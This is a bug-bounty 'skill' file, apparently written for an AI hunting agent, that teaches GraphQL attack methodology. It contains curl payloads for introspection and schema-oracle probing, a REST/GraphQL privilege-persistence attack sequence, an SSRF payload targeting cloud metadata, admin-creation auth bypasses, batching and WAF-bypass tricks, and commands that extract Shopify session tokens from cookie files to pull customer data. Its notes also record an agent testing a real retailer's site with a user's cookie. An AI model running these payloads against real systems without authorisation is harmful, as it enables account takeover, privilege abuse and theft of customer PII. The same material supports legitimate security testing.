---
name: hunt-graphql
description: Hunting skill for graphql vulnerabilities. Built from 12 public bug bounty reports across IDOR via node() / GID, mutation IDOR including AI/LLM features, cross-tenant IDOR, SSRF via argument, batching-DoS, query-cost-bypass, SQLi via argument, broken-object-level-authz, auth-bypass via unscoped mutations, and PII exposure from missing field-level authz. Use when hunting graphql on any target.
sources: hackerone_public, github, gitlab_security
report_count: 12
---

## Crown Jewel Targets

GraphQL vulnerabilities are high-value because the attack surface is both broad and deep — a single endpoint can expose entire data models, privilege escalation paths, and cross-API state confusion. Highest payouts occur in:

- **Platform APIs** (GitHub, Shopify, Stripe-tier targets) where GraphQL mutations interact with REST APIs managing the same resources
- **Race conditions between GraphQL mutations and REST endpoints** where state synchronization is non-atomic — these hit medium-to-high severity reliably
- **Authorization persistence bugs** where team/org/repo membership state is controlled by one API but readable/writable by another
- **B2B SaaS platforms** where one tenant affecting another via schema traversal = critical
- **Internal admin GraphQL endpoints** accidentally exposed to lower-privilege users

The GitHub reports demonstrate the crown jewel pattern: **privilege that should be revoked persists because two APIs disagree on ground truth**.

---

## Attack Surface Signals

**URL Patterns:**
```
/graphql
/api/graphql
/v1/graphql
/query
/gql
/graph
/api/v2/graphql
/internal/graphql
```

**Response Headers:**
```
Content-Type: application/json  (with query body)
X-Request-Id + no REST-style path params = likely GraphQL
```

**JavaScript Source Patterns:**
```js
// grep for these in JS bundles
"query {"
"mutation {"
"__typename"
"apollo"
"ApolloClient"
"graphql-tag"
"gql`"
"operationName"
"GRAPHQL_URI"
```

**Tech Stack Signals:**
- Apollo Server/Client in JS bundles
- Relay in React apps
- `graphene` or `strawberry` (Python), `graphql-ruby`, `gqlgen` (Go), `Lighthouse` (Laravel)
- POST requests with `{"query": "..."}` body shape in Burp history
- `__schema` or `__type` in any response = confirmed GraphQL

**Recon Sources:**
- `github.com` search: `"graphql" site:target.com`
- Wayback Machine for `/graphql` paths
- JS bundle scanning with `LinkFinder` or `getallurls`

---

## Step-by-Step Hunting Methodology

1. **Discover the endpoint** — spider JS bundles, check `/graphql`, `/api/graphql`, review Burp passive scan hits for `application/json` POST with query fields

2. **Test introspection** — send the full introspection query. Even if blocked, try field-level enumeration:
   ```graphql
   { __typename }
   ```
   If that returns, introspection may be partially blocked but the schema is discoverable

3. **Map the full schema** — use `InQL` (Burp extension) or `graphql-voyager` to visualize relationships. Specifically look for:
   - Mutations that modify ownership, permissions, or membership
   - Mutations that mirror REST API functionality

4. **Identify REST/GraphQL overlap** — document every resource that can be modified via BOTH REST and GraphQL. These dual-write surfaces are your RC targets.

5. **Test authorization boundaries per mutation** — replay mutations as lower-privilege users. Does the server enforce the same authz as the equivalent REST call?

6. **Hunt cross-API state desync** — find sequences where:
   - REST action should revoke access
   - GraphQL mutation re-grants or preserves it
   - Test the ordering: REST first → GraphQL → check state; then GraphQL first → REST → check state

7. **Test for persistent privilege after role/membership changes** — remove a user via REST, then call the corresponding GraphQL mutation for that resource. Query current state via both APIs and compare.

8. **Probe for IDOR in node IDs** — GraphQL global IDs often encode object type + ID. Swap IDs across object boundaries and across account contexts.

9. **Check batch query abuse** — send arrays of operations to bypass rate limiting or amplify enumeration.

10. **Document the exact reproduction chain** — for RC bugs, time-based steps must be reproducible deterministically.

---

## Payload & Detection Patterns

**Full Introspection Query:**
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
```

**Minimal Introspection Probe (bypass attempt):**
```graphql
{ __typename }
```

**curl introspection test:**
```bash
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query":"{ __schema { queryType { name } } }"}' | jq .
```

**Field suggestion probe (bypass blind introspection blocks):**
```graphql
{ unknownField }
```
If response returns `"Did you mean: [realFieldName]?"` — schema is enumerable despite introspection being disabled.

**Do not rely on suggestions alone.** Many servers (graphql-js without the suggestion
plugin, some Apollo configs) return a bare `Cannot query field "X" on type "Query".` with
no `Did you mean` at all. When that happens, use the two oracles below instead of firing
hundreds of guessed field names.

**Oracle 2 — argument-signature leak (the highest-value one).** Sending a mutation name
with NO arguments makes the server validate arguments before the resolver runs, and the
validation error *prints the whole signature* without any auth check:

```bash
curl -s -X POST https://target/graphql -H 'Content-Type: application/json' \
  -d '{"query":"mutation { appCreate { __typename } }"}'
```
```json
{"errors":[
  {"message":"Argument \"Mutation.appCreate(name:)\" of type \"String!\" is required, but it was not provided."},
  {"message":"Argument \"Mutation.appCreate(redirectUri:)\" of type \"String!\" is required, but it was not provided."}]}
```
Two things fall out of one request: the mutation **exists**, and its **exact argument
names + types**. Repeat with the now-known args to learn the return type field-by-field
(`Cannot query field "name" on type "AppCreate"` vs accepted `key` / `secret`).

**Oracle 3 — resolver-reached vs auth-gated (the authorization test).** The error text
is the discriminator, and it is a property of the resolver, not of your request:

| Anonymous response | Meaning |
|---|---|
| `{"message":"Not Authorised!","extensions":{"code":"UNAUTHENTICATED"}}` / `Forbidden` / `401` | guard present — correct behaviour |
| `Application not found` / `ValidationError` / `Cannot read properties of undefined` / any TypeError | **no guard — the resolver executed business logic** |
| `{"data":{"field":null}}` with zero errors | **no guard — resolver ran to completion** |

Always pair the suspect field with a **sibling control** from the same namespace in the
same test run (e.g. six `appConnector*` mutations unguarded while `appCreate` in the same
`app*` mutation namespace returns `Not Authorised!`). The guard existing one field away is
what makes the finding unarguable — it proves the omission is a code-path gap, not a
design decision. See `references/unauth-resolver-discovery.md` for the full method and a
worked case (SignalStack Connect API, 6 unguarded vs 9 guarded, Medium 6.5 → High 8.1).

**Oracle 2b — enum value discovery.** Enums are invisible without introspection, and argument
validation prints the *type name* but not its values. Brute the values against the enum oracle:
each rejected candidate proves non-membership, an accepted one changes the error and tells you
you are through the parser.

```bash
curl -s -X POST https://target/graphql -H 'Content-Type: application/json' \
  -d '{"query":"mutation { signup(type:EMAIL, credentials:{}) { key } }"}'
```
```json
{"errors":[{"message":"Value \"EMAIL\" does not exist in \"AuthTypeInput\" enum."}]}
```

Candidates that commonly hit: `token`, `password`, `google`, `apple`, `id`, `oauth`, `sso`,
`magic`, plus uppercase variants. On SignalStack, `password` was valid and `EMAIL` was not —
`type:password` with a real email moved the resolver from enum-validation to
`"Password is too weak"`, i.e. past the schema layer and into business logic. Pair this with
Oracle 3: reaching a validation error (weak password, invalid email) is proof the resolver
executed, and a later `"Sorry, no bots allowed"` tells you the captcha sits *after* argument
validation, not before it.

**Oracle 4 — type-shape oracle (impact evidence WITHOUT a credential).** When a resolver is
confirmed unguarded but you cannot obtain a valid key/id, stop trying to get data and enumerate
the *shape* of what it would return. GraphQL validates the selection set against the schema
**before** execution, so an invalid sub-selection names the type — no introspection, no auth.

```bash
curl -s -X POST https://target/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ appConnector(key:\"<uuid>\",connectorKey:\"<uuid>\"){ accounts { id } } }"}'
```
```json
{"errors":[{"message":"Field \"accounts\" must not have a selection since type \"JSON!\" has no subfields."}]}
```

`JSON!` proves the field is a serialized blob — that is the account dataset, not an id — without
one byte of data. Probe candidate field names one at a time: accepted (resolver-level error or
`{"data":null}`) = field exists; `Cannot query field "X" on type "Y"` = absent **and names the
type**. Repeat against **mutation return types** to see what a mutation hands back
(`ProviderAuthentication` → `credentials: [String]`, `type`, `help`).

Use it to write the impact section when data return is impossible: **prove the data model, not
the data.** A resolver → return type → confirmed-fields table is far stronger than "could expose
sensitive data", and it stays honest about the ceiling. Worked SignalStack map:
`references/unauth-resolver-discovery.md` §4.

**Batch query amplification:**
```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]
```

**RC desync test pattern (pseudo-sequence):**
```bash
# Step 1: Grant access via REST
curl -X PUT https://api.target.com/repos/ORG/REPO/teams/TEAM \
  -H "Authorization: token ADMIN_TOKEN" \
  -d '{"permission":"admin"}'

# Step 2: Revoke via REST  
curl -X DELETE https://api.target.com/repos/ORG/REPO/teams/TEAM \
  -H "Authorization: token ADMIN_TOKEN"

# Step 3: Re-assert via GraphQL mutation
curl -X POST https://api.target.com/graphql \
  -H "Authorization: bearer ATTACKER_TOKEN" \
  -d '{"query":"mutation { updateTeamsRepository(input: {repositoryId: \"REPO_ID\", teamId: \"TEAM_ID\", permission: ADMIN}) { clientMutationId } }"}'

# Step 4: Verify persistent access
curl https://api.target.com/repos/ORG/REPO/teams \
  -H "Authorization: token ADMIN_TOKEN"
```

**Grep for GraphQL in JS bundles:**
```bash
grep -Eo '(query|mutation|subscription)\s+\w+\s*[\({]' bundle.js
grep -Eo '"(/[a-z0-9/_-]*graphql[a-z0-9/_-]*)"' bundle.js
```

**InQL / clairvoyance for blind schema enumeration:**
```bash
python3 clairvoyance.py -u https://target.com/graphql \
  -H "Authorization: Bearer TOKEN" \
  -w wordlist.txt -o schema.json
```

---

## Common Root Causes

1. **Dual-write without atomic locking** — developers implement the same resource modification in both REST and GraphQL independently. Neither system is aware the other exists for that resource. State updates aren't serialized or compared.

2. **Inconsistent authorization middleware** — REST endpoints go through one auth layer (e.g., middleware chain), GraphQL resolvers go through a different resolver-level check. The same action, different enforcement.

3. **GraphQL as "new REST" migration** — teams add GraphQL mutations that mirror REST functionality without auditing the permission model. The GraphQL version is less mature and skips checks the REST version accumulated over time.

4. **Introspection left on in production** — default framework settings (Apollo, Graphene) enable introspection in all environments. Developers forget to disable it, treating it as "just documentation."

5. **Node ID trust without re-authorization** — GraphQL global IDs (`base64("ObjectType:123")`) are decoded and trusted without verifying the requesting user has access to that specific object.

6. **Mutation side effects not mirrored** — when a REST action triggers cascading effects (e.g., team removal cascades to permission revocation), the GraphQL equivalent mutation doesn't trigger the same cascades.

---

## Bypass Techniques

**Defense: Introspection disabled**
- Bypass via field suggestion errors — send invalid field names and parse "did you mean X?" responses
- Use `clairvoyance` to brute-force field names against a wordlist
- Check JS bundles for hardcoded query strings that reveal the schema

**Defense: Depth limiting**
- Fragment spread to increase effective depth without hitting the limiter:
```graphql
fragment F on User { repos { teams { members { ...F } } } }
```

**Defense: Rate limiting per IP**
- Use batch operations (array of queries in one POST)
- Distribute across authenticated sessions

**Defense: Auth checks on mutations**
- Test with tokens at different privilege tiers (viewer, member, admin)
- Test unauthenticated — some mutations don't check session at all
- Test with tokens from *different organizations* — multi-tenant IDOR

**Defense: WAF blocking `__schema`**
- Alias the introspection field:
```graphql
{ s: __schema { t: types { n: name } } }
```
- Use HTTP parameter pollution or alternate content-type headers

**Defense: Operation whitelisting (persisted queries)**
- Check if the server falls back to ad-hoc queries when the `extensions.persistedQuery` hash mismatches
- Look for a non-whitelisted endpoint (dev, staging, internal proxy)

### Alias batching: when it wins races vs when it doesn't

A common claim is "alias batching defeats per-user rate limits and double-spend protections." Whether this actually wins depends on the **resolver execution model**:

| Resolver type | Behavior on aliased mutations | Alias batching wins races? |
|---|---|---|
| Multi-threaded / `DataLoader`-batched async | Aliases run concurrently, share state via batch | **YES** — single HTTP request can amplify a race-target N times |
| Single-threaded / single-DB-connection per request | Aliases run serially; first mutation closes the door | **NO** — combine with parallel HTTP |
| Distributed gateway (Apollo Federation) | Sub-queries dispatched concurrently to subgraphs | Depends on each subgraph |

**Verification example (single-threaded Flask + SQLite resolver):**
- 10 aliased `redeemCoupon` mutations in one request → only `r1` succeeds, r2-r10 fail with `already_redeemed`. Alias batching alone is insufficient.
- The same 10 mutations as **20 parallel HTTP POSTs** → 20 successes ($2000 from a $100 coupon).

**Operator rule:** treat alias batching as a single-RTT recon primitive. For race-target exploitation, combine with `hunt-race-condition`'s parallel-HTTP / Turbo Intruder single-packet attack. Verified in `docs/verification/phase2e-jwt-graphql-race.md` Test 11 vs Test 12.

---

## Gate 0 Validation

1. **What can the attacker DO right now?**
   Must be a concrete action: access data they shouldn't see, retain privileges after revocation, modify another user's resources. "The schema is visible" alone is not enough — what does the schema unlock?

2. **What does the victim LOSE?**
   Must be a real asset: data confidentiality, access control integrity, org security guarantees. For the RC pattern: an org admin loses the guarantee that removing a team revokes all access. That's a security contract violation.

3. **Can it be reproduced in 10 minutes from scratch?**
   For RC/desync bugs: write the exact curl sequence. Run it twice. If the privilege persists deterministically (not timing-dependent flakiness), it's reportable. If it requires millisecond timing luck, document the window and test on low-load times.

---

## Real Impact Examples

**Scenario A — Covert Persistent Admin After Team Removal (GitHub-pattern)**
An attacker who legitimately had admin access to a repository via team membership gets removed by the org admin through the REST API. The attacker, before removal completes, calls the `updateTeamsRepository` GraphQL mutation to re-associate their team with admin permissions. The REST removal and GraphQL re-grant create a desync where the UI shows the team as removed, but the GraphQL state preserves admin-level access. The attacker retains covert write access to the repository indefinitely — pushing code, reading secrets in CI/CD — without appearing in the team's member list. This persists through org audits.

**Scenario B — Covert Access via Repo Transfer Race (GitHub-pattern)**
An attacker with admin access initiates a repository transfer to another organization via the REST API. During or after the transfer, they invoke `updateTeamsRepository` on the now-transferred repo's ID. Because the GraphQL mutation doesn't validate current org ownership state consistently with the REST transfer event, the original attacker's team retains admin access on a repo now owned by a different organization. The receiving org has no visibility into this team association. The attacker can exfiltrate intellectual property from an org they have no legitimate relationship with.

**Scenario C — Introspection as Reconnaissance Prerequisite (Shopify-pattern)**
On a platform where introspection is intentionally enabled (per-program rules), a hunter maps the full schema and discovers undocumented mutations for `fulfillmentOrderMove` and `inventoryAdjust` that are not surfaced in public docs. These mutations accept merchant IDs as arguments with no scoping validation visible in the schema. This recon directly enables targeted IDOR testing against merchant-to-merchant data isolation — the introspection itself is zero-severity, but it is the entry point to critical findings.

---

## Disclosed Report Citations (Backfill +9 — 2019-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill beyond the original 3 internal references. Each is a distinct GraphQL subclass with a working PoC documented in the cited writeup.

4. **HackerOne — Confidential user-data exposure via GraphQL `User` type** ([H1 #489146](https://hackerone.com/reports/489146))
    - Subclass: broken field-level authorization (PII exposure)
    - Payload: direct `user(id:...)` query returning `email`, `backup_codes_hash`, `facebook_user_id`, `account_recovery_phone_number_verified_at`, `totp_enabled`
    - Root cause: backend migration introduced a GraphQL `User` type with no field-level authz; any authenticated user could enumerate PII of all users
    - Year: 2019 — **$20,000**, 1,028 upvotes

5. **HackerOne — `DestroyLlmConversation` mutation IDOR (Copilot pre-release)** ([H1 #2218334](https://hackerone.com/reports/2218334))
    - Subclass: mutation IDOR on AI/LLM feature
    - Payload: `mutation { destroyLlmConversation(input:{id:"<victim_conv_id>"}) { … } }`
    - Root cause: new LLM-conversation mutation shipped without authorization decorator; any user could destroy any conversation
    - Year: 2023 — caught pre-launch, no bounty (202 upvotes)

6. **Shopify — `BillingDocumentDownload` cross-tenant IDOR** ([H1 #2207248](https://hackerone.com/reports/2207248))
    - Subclass: IDOR on relay GID across tenants
    - Payload: `query { billingDocumentDownload(id:"gid://shopify/BillingInvoice/<other_shop_id>") { url } }`
    - Root cause: `BillingInvoice` resolver authorized the requester's shop but did not verify the invoice belonged to that shop
    - Year: 2024 — **$5,000**, 175 upvotes

7. **Shopify — Rate-limit bypass via negative cost** ([H1 #481518](https://hackerone.com/reports/481518))
    - Subclass: query-cost-calc abuse (sibling pattern to alias batching)
    - Payload: `query { products(first:-100) { … } }` — negative `first` produced a negative query-cost contribution, refilling the leaky-bucket each call
    - Root cause: query-cost calculator did not floor at zero; negative values subtracted from the consumed budget
    - Year: 2019 — **$1,000**

8. **Stripe — Cross-tenant IDOR via `UpdateAtlasApplicationPerson`** ([H1 #1066203](https://hackerone.com/reports/1066203))
    - Subclass: cross-tenant IDOR on mutation
    - Payload: `mutation { updateAtlasApplicationPerson(input:{personId:"<victim_person_id>", …}) }` — adding/modifying a co-founder on another merchant's Stripe Atlas application
    - Root cause: mutation scoped only to "is admin of some merchant," not "is admin of the merchant owning this person"
    - Year: 2020 — bounty undisclosed (resolved)

9. **EXNESS — SSRF in GraphQL `allTicks` query** ([H1 #1864188](https://hackerone.com/reports/1864188))
    - Subclass: SSRF via GraphQL argument
    - Payload: `query { allTicks(source:"http://169.254.169.254/latest/meta-data/") { … } }` — `source` arg fed into a server-side HTTP client
    - Root cause: GraphQL field accepted a URL arg and dereferenced it without scheme/host allowlist
    - Year: 2023 — **$3,000**, 249 upvotes

10. **EXNESS — GraphQL attribute-batching DoS** ([H1 #2293642](https://hackerone.com/reports/2293642))
    - Subclass: DoS via batching / deep-attribute amplification on unauth endpoint
    - Payload: single HTTP request containing N batched operations, each requesting deeply nested attribute trees, sustained until origin OOM
    - Root cause: no query-depth, query-complexity, or batch-size limits on unauthenticated `/graphql`
    - Year: 2024 — bounty undisclosed (resolved)

11. **GitLab — Malicious-runner attach via `runnerUpdate` (CVE-2023-2478)** ([Advisory](https://about.gitlab.com/releases/2023/05/05/critical-security-release-gitlab-15-11-2-released/))
    - Subclass: auth bypass on mutation / project-scope missing
    - Payload: `mutation { runnerUpdate(input:{id:"<attacker_runner_gid>", associatedProjects:["<victim_project_gid>"]}) }`
    - Root cause: `runnerUpdate` did not check that the caller had Maintainer on the target project — any user could bind their malicious runner and intercept CI jobs (build secrets, code execution)
    - Year: 2023 — Critical, CVSS 9.6 (H1 bounty undisclosed; GitLab Critical-tier typically $20k–$35k)

12. **AS Watson — Auth bypass via unrestricted `createAdminUser` mutation** ([HackerOne blog](https://www.hackerone.com/blog/how-graphql-bug-resulted-authentication-bypass))
    - Subclass: sensitive mutation reachable without authentication (introspection-aided discovery)
    - Payload: `mutation { createAdminUser(input:{email:"x@x", role:"ADMIN", password:"…"}) { token } }` invoked unauthenticated after schema enumeration via introspection
    - Root cause: schema lacked per-field authorization directives; `createAdminUser` exposed to public role
    - Year: 2023 — "Best Bug" prize at HackerOne Ambassador World Cup

---

## Shopify Storefront API — Token Handling & Auth Patterns

When testing Shopify Storefront API GraphQL endpoints, the token handling differs from standard JWT-based APIs:

### Token Extraction from Session Cookie

Shopify's session cookie (`session=...`) contains a JWT-like structure with an embedded `shcat_` access token. Two approaches work:

**Approach 1 — Use session cookie directly as customerAccessToken:**
```bash
SESSION=$(grep '^session=' cookies.txt | cut -d= -f2)
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=$SESSION; cart=$CART_COOKIE" \
  -H "Origin: https://www.target.com" \
  -H "Referer: https://www.target.com/account" \
  -d "{\"query\":\"{customer(customerAccessToken:\\\"$SESSION\\\"){email firstName lastName}}\"}" \
  "https://checkout.target.com/api/graphql"
```

**Approach 2 — Extract shcat_ token and use as Bearer:**
```bash
TOKEN=$(grep -oP 'shcat_[A-Za-z0-9_\-\.]+' cookies.txt | head -1)
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Origin: https://www.target.com" \
  -H "Referer: https://www.target.com/account" \
  -d '{"query":"{customer{email firstName lastName}}"}' \
  "https://checkout.target.com/api/graphql"
```

### Shopify GraphQL Access Scopes

Shopify uses scope-based access control. The session cookie from the browser may have limited scopes:

| Scope | Access |
|-------|--------|
| `unauthenticated_read_customers` | Read customer profile, orders, addresses |
| `unauthenticated_write_customers` | Create customer, login, password reset |
| `unauthenticated_read_metaobjects` | Read metaobjects |
| `unauthenticated_read_checkout` | Read checkout data |

If you get `ACCESS_DENIED` with a scope error, the token lacks that scope. A fresh login token typically has more scopes than a session cookie.

### Shopify-Specific Behaviors

1. **Batch queries return UNSUPPORTED_MEDIA_TYPE** — Shopify's GraphQL doesn't support batch operations (array of queries in one POST).

2. **Fragment validation is strict** — Shopify validates fragments against the schema. `... on Product` inside a `Merchandise` union will fail with `cannotSpreadFragment`.

3. **Node ID validation** — Shopify validates node IDs and returns `"invalid id"` for non-existent or malformed IDs. GIDs must be in format `gid://shopify/Type/id`.

4. **Cart mutations are permissive** — `cartNoteUpdate`, `cartAttributesUpdate` work with just the session cookie and don't validate ownership beyond having a valid cart ID. This is by design (cart notes are user-editable).

5. **Cart clone is secured** — `cartClone` requires authentication and proper authorization.

6. **URL redirects query** — `urlRedirects` may return INTERNAL_SERVER_ERROR on some Shopify stores (not a vulnerability, just a server-side issue).

7. **Products and search are public** — No authentication required for product catalog and search queries.

8. **Shop info is public** — Shop name, description, and payment settings are accessible without auth.

### Testing Cart IDOR on Shopify

To test if User A can access User B's cart:
```graphql
# Get User A's cart ID from cookie
# Try to access it with User B's session
mutation {
  cartNoteUpdate(
    cartId: "gid://shopify/Cart/USER_A_CART_ID",
    note: "hacked"
  ) {
    cart { id note }
    userErrors { field message }
  }
}
```

If this succeeds, it's a cart IDOR. However, Shopify cart IDs are typically single-use and tied to the session, so this is usually not exploitable.

---

## Pitfalls

1. **Testing the wrong target** — When the user provides a cookie for a specific target (e.g., e.l.f. Cosmetics), do NOT test it against other targets (e.g., WellPeople). The cookie is domain-specific and won't work across targets. The user explicitly corrected this: "do not test well pepeles it antoehr targt this cookie is for elf one".

2. **Session cookie vs access token** — The browser session cookie (`session=...`) is NOT the same as the GraphQL access token. The session cookie contains an embedded `shcat_` token, but using the session cookie directly as the `customerAccessToken` argument will fail with ACCESS_DENIED for customer queries. Cart mutations work because they use the cart session, not the customer access token.

3. **Token extraction failures** — The session cookie uses a custom encoding that can't be easily decoded with standard base64/JWT tools. Don't waste time trying to extract the `shcat_` token — use the session cookie directly in the Cookie header for cart operations, and accept that customer data requires a proper login flow token.

4. **Scope limitations** — When the user says "only main domains" are in scope, all subdomain findings (subdomain takeovers, API exposures, etc.) are OUT OF SCOPE and cannot be reported. Always confirm scope before testing.

5. **Cookie format variations** — Different Shopify stores may use different cookie formats. The e.l.f. Cosmetics cookie from `in.elfcosmetics.com/account/info` has a different structure than the one from `www.elfcosmetics.com`. Don't assume the same extraction method works across all cookies.

## Support Files

- `references/shopify-storefront-api-testing.md` — Token extraction, access scopes, Shopify-specific behaviors, and test results for Shopify Storefront API endpoints
- `references/unauth-resolver-discovery.md` — Finding unauthorized resolvers when introspection is off: the argument-signature oracle, the guard-vs-resolver error discriminator, sibling controls, and the worked SignalStack case (6 unguarded vs 9 guarded) with its honest severity ceiling

## Related Skills & Chains

- **`hunt-idor`** — GraphQL `node(id:)` and global-relay-ID resolvers are IDOR factories: same shape, no scoping. Chain primitive: GraphQL introspection + IDOR (`node()` resolver) → cross-tenant data via base64-decoded type:id replay.
- **`hunt-api-misconfig`** — GraphQL mutations are mass-assignment magnets: clients send full input objects, server merges. Chain primitive: GraphQL mutation + extra fields (`isAdmin:true`, `verified:true`) → mass assignment → role escalation.
- **`hunt-business-logic`** — GraphQL aliases let you call the same mutation N times in one request, defeating per-request rate limits. Chain primitive: aliased mutation + business-logic flaw → coupon redeemed N times in single network round-trip.
- **`hunt-race-condition`** — GraphQL batching collapses N mutations into one HTTP packet — perfect single-packet race vehicle. Chain primitive: GraphQL batch + race → atomic-update missing → double-spend balance.
- **`security-arsenal`** — Load the GraphQL Payload Pack: introspection query, schema-suggestion error probe, alias amplification template, depth-bomb DoS payload, batch-attack template.
- **`triage-validation`** — Apply the Body-Diff Rule: introspection alone is informational; require a concrete cross-tenant read or mutation-with-impact PoC before submitting.